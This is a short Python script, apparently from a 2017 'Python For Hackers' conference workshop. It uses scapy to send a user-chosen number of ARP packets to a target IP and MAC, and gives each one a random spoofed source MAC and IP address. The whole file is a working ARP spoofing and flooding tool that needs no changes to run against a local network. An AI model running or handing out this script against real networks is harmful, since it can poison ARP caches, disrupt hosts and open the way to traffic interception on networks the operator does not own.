# Hacktrickconf 2017 - EmreOvunc
# Python For Hackers

from scapy.all import *
arpPacket = ARP()
targetIP = input('Target IP: ')
arpPacket.pdst = targetIP
targetMAC = input('Target MAC: ')
arpPacket.hwdst = targetMAC

packetNumber = int(input('How many packets: '))
while int(packetNumber) >= 0:
    mac = [random.randint(0x00, 0xff), random.randint(0x00, 0xff),
           random.randint(0x00, 0xff), random.randint(0x00, 0xff),
           random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    fakeMac = ':'.join(map(lambda x: "%02x" % x, mac))
    arpPacket.hwsrc = fakeMac
    sourceIP = ".".join(map(str, (random.randint(0, 255)for _ in range(4))))
    arpPacket.psrc = sourceIP
    arpPacket.show()
    send(arpPacket)
    packetNumber -= 1
